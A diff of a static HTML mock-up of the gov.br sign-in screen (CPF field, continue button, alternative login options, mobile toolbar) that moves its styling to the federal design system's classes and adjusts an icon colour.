@@ -3,6 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <title>sso.acesso.gov.br</title>
+<!-- Design System de Governo Federal (@govbr-ds/core v3.7.0), vendored locally -->
+<link rel="stylesheet" href="assets/vendor/govbr-ds-core.min.css">
 <link rel="stylesheet" href="styles.css">
 <style>
   .gov-header {
@@ -77,83 +79,28 @@
     line-height: 1.4;
   }
 
-  label.cpf-label {
-    display: block;
-    font-size: 15px;
-    color: #101010;
-    margin-bottom: 8px;
-  }
-
-  input.cpf-input {
-    width: 100%;
-    height: 52px;
-    border-radius: 8px;
-    border: 2px solid #5b9bd5;
-    background: var(--govbr-input-yellow);
-    box-shadow: 0 0 0 3px rgba(91, 155, 213, 0.35);
-    font-size: 16px;
-    font-style: italic;
-    color: #6d6d6d;
-    padding: 0 16px;
-    margin-bottom: 26px;
-  }
-
-  input.cpf-input::placeholder {
-    color: #8d8d6a;
-    font-style: italic;
-  }
-
-  button.continue-btn {
-    width: 100%;
-    height: 54px;
-    border: none;
-    border-radius: 27px;
-    background: var(--govbr-blue);
-    color: #fff;
-    font-size: 17px;
-    font-weight: 700;
-    margin-bottom: 30px;
-  }
-
   .other-options-title {
     font-size: 16px;
     color: #101010;
     padding-bottom: 10px;
     border-bottom: 2px solid #101010;
-    margin-bottom: 22px;
+    margin-bottom: 8px;
   }
 
-  .option-row {
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    margin-bottom: 26px;
-  }
-
-  .option-row .label {
+  .br-list .option-label {
     font-size: 16px;
     color: #101010;
-    white-space: nowrap;
   }
 
-  .option-row.bank .label {
+  .br-list .option-label.bank {
     color: var(--govbr-green);
     font-weight: 500;
   }
 
-  .option-row.bank {
-    gap: 10px;
-  }
-
-  .badge {
-    background: var(--govbr-green);
-    color: #fff;
-    font-size: 9px;
-    font-weight: 700;
-    padding: 4px 6px;
-    border-radius: 3px;
-    letter-spacing: 0.2px;
+  .br-tag {
+    font-size: 10px;
     white-space: nowrap;
+    text-transform: uppercase;
   }
 </style>
 </head>
@@ -209,8 +156,8 @@
         <circle cx="12" cy="12" r="10" stroke="#101010" stroke-width="1.4" fill="none"/>
       </svg>
       <svg width="26" height="26" viewBox="0 0 24 24">
-        <circle cx="17" cy="6" r="2.4" fill="none" stroke="#1451b4" stroke-width="1.6"/>
-        <path d="M4 21c2-4 4-6 8-6M8 12l3-1 2 3 4 1M12 12v-3l4-2" stroke="#1451b4" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        <circle cx="17" cy="6" r="2.4" fill="none" stroke="#1351b4" stroke-width="1.6"/>
+        <path d="M4 21c2-4 4-6 8-6M8 12l3-1 2 3 4 1M12 12v-3l4-2" stroke="#1351b4" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
     </div>
   </div>
@@ -224,10 +171,10 @@
       <div class="icon-box">
         <svg width="20" height="16" viewBox="0 0 24 20" fill="none">
           <rect x="0.5" y="0.5" width="23" height="19" rx="2" fill="#fff"/>
-          <circle cx="7" cy="10" r="3.2" fill="#1451b4"/>
-          <rect x="13" y="6" width="8" height="1.6" fill="#1451b4"/>
-          <rect x="13" y="9.5" width="8" height="1.6" fill="#1451b4"/>
-          <rect x="13" y="13" width="5" height="1.6" fill="#1451b4"/>
+          <circle cx="7" cy="10" r="3.2" fill="#1351b4"/>
+          <rect x="13" y="6" width="8" height="1.6" fill="#1351b4"/>
+          <rect x="13" y="9.5" width="8" height="1.6" fill="#1351b4"/>
+          <rect x="13" y="13" width="5" height="1.6" fill="#1351b4"/>
         </svg>
       </div>
       <span>Número do CPF</span>
@@ -235,45 +182,65 @@
 
     <p class="helper">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
 
-    <label class="cpf-label">CPF</label>
-    <input class="cpf-input" type="text" placeholder="Digite seu CPF" />
+    <div class="br-input mb-4">
+      <label for="cpf">CPF</label>
+      <input id="cpf" type="text" placeholder="Digite seu CPF" />
+    </div>
 
-    <button class="continue-btn">Continuar</button>
+    <button class="br-button primary large block mb-6" type="button">Continuar</button>
 
     <div class="other-options-title">Outras opções de identificação:</div>
 
-    <div class="option-row bank">
-      <svg width="30" height="30" viewBox="0 0 24 24">
-        <circle cx="12" cy="12" r="11" fill="none" stroke="#168821" stroke-width="1.8"/>
-        <text x="12" y="17" font-size="13" font-weight="700" text-anchor="middle" fill="#168821">$</text>
-      </svg>
-      <span class="label">Login com seu banco</span>
-      <span class="badge">SUA CONTA SERÁ PRATA</span>
-    </div>
-
-    <div class="option-row">
-      <svg width="30" height="30" viewBox="0 0 24 24">
-        <rect x="2" y="2" width="20" height="20" rx="4" fill="#1451b4"/>
-        <path d="M8 16l3-7 3 7M9 13.5h4" stroke="#fff" stroke-width="1.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-      <span class="label">Seu aplicativo gov.br</span>
-    </div>
-
-    <div class="option-row">
-      <svg width="30" height="30" viewBox="0 0 24 24">
-        <rect x="7" y="1" width="10" height="22" rx="4" fill="#1451b4"/>
-        <rect x="9" y="5" width="6" height="3" rx="1" fill="#fff"/>
-      </svg>
-      <span class="label">Seu certificado digital</span>
-    </div>
-
-    <div class="option-row">
-      <svg width="32" height="30" viewBox="0 0 24 24">
-        <path d="M6 17a4 4 0 0 1 .3-8 5 5 0 0 1 9.6-1.5A4.5 4.5 0 0 1 19 17H6z" fill="#1451b4"/>
-        <circle cx="12.5" cy="14.2" r="1.6" fill="#fff"/>
-        <rect x="11.8" y="15.4" width="1.4" height="2.4" fill="#fff"/>
-      </svg>
-      <span class="label">Seu certificado digital em nuvem</span>
+    <div class="br-list" role="list">
+      <div class="br-item" role="listitem">
+        <div class="row align-items-center">
+          <div class="col-auto">
+            <svg width="30" height="30" viewBox="0 0 24 24">
+              <circle cx="12" cy="12" r="11" fill="none" stroke="#168821" stroke-width="1.8"/>
+              <text x="12" y="17" font-size="13" font-weight="700" text-anchor="middle" fill="#168821">$</text>
+            </svg>
+          </div>
+          <div class="col option-label bank">Login com seu banco</div>
+          <div class="col-auto"><span class="br-tag bg-green-cool-vivid-50"><span>SUA CONTA SERÁ PRATA</span></span></div>
+        </div>
+      </div>
+      <span class="br-divider"></span>
+      <div class="br-item" role="listitem">
+        <div class="row align-items-center">
+          <div class="col-auto">
+            <svg width="30" height="30" viewBox="0 0 24 24">
+              <rect x="2" y="2" width="20" height="20" rx="4" fill="#1351b4"/>
+              <path d="M8 16l3-7 3 7M9 13.5h4" stroke="#fff" stroke-width="1.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="col option-label">Seu aplicativo gov.br</div>
+        </div>
+      </div>
+      <span class="br-divider"></span>
+      <div class="br-item" role="listitem">
+        <div class="row align-items-center">
+          <div class="col-auto">
+            <svg width="30" height="30" viewBox="0 0 24 24">
+              <rect x="7" y="1" width="10" height="22" rx="4" fill="#1351b4"/>
+              <rect x="9" y="5" width="6" height="3" rx="1" fill="#fff"/>
+            </svg>
+          </div>
+          <div class="col option-label">Seu certificado digital</div>
+        </div>
+      </div>
+      <span class="br-divider"></span>
+      <div class="br-item" role="listitem">
+        <div class="row align-items-center">
+          <div class="col-auto">
+            <svg width="32" height="30" viewBox="0 0 24 24">
+              <path d="M6 17a4 4 0 0 1 .3-8 5 5 0 0 1 9.6-1.5A4.5 4.5 0 0 1 19 17H6z" fill="#1351b4"/>
+              <circle cx="12.5" cy="14.2" r="1.6" fill="#fff"/>
+              <rect x="11.8" y="15.4" width="1.4" height="2.4" fill="#fff"/>
+            </svg>
+          </div>
+          <div class="col option-label">Seu certificado digital em nuvem</div>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -284,17 +251,17 @@
 
   <div class="bottom-toolbar">
     <div class="round-btn">
-      <svg width="14" height="14" viewBox="0 0 24 24"><path d="M16 4l-8 8 8 8" stroke="#1451b4" stroke-width="2.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <svg width="14" height="14" viewBox="0 0 24 24"><path d="M16 4l-8 8 8 8" stroke="#1351b4" stroke-width="2.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
     </div>
     <div class="group">
       <div class="round-btn">
-        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 3v13M8 7l4-4 4 4" stroke="#1451b4" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/><rect x="5" y="15" width="14" height="6" rx="1.5" stroke="#1451b4" stroke-width="1.8" fill="none"/></svg>
+        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 3v13M8 7l4-4 4 4" stroke="#1351b4" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/><rect x="5" y="15" width="14" height="6" rx="1.5" stroke="#1351b4" stroke-width="1.8" fill="none"/></svg>
       </div>
       <div class="round-btn">
-        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M4 12a8 8 0 0 1 13.7-5.7M20 12a8 8 0 0 1-13.7 5.7" stroke="#1451b4" stroke-width="1.8" fill="none" stroke-linecap="round"/><path d="M18 3v4h-4M6 21v-4h4" stroke="#1451b4" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M4 12a8 8 0 0 1 13.7-5.7M20 12a8 8 0 0 1-13.7 5.7" stroke="#1351b4" stroke-width="1.8" fill="none" stroke-linecap="round"/><path d="M18 3v4h-4M6 21v-4h4" stroke="#1351b4" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
       <div class="round-btn">
-        <svg width="18" height="18" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke="#1451b4" stroke-width="1.8" fill="none"/><path d="M15 9l-4 2-2 4 4-2z" fill="#1451b4"/></svg>
+        <svg width="18" height="18" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke="#1351b4" stroke-width="1.8" fill="none"/><path d="M15 9l-4 2-2 4 4-2z" fill="#1351b4"/></svg>
       </div>
     </div>
   </div>
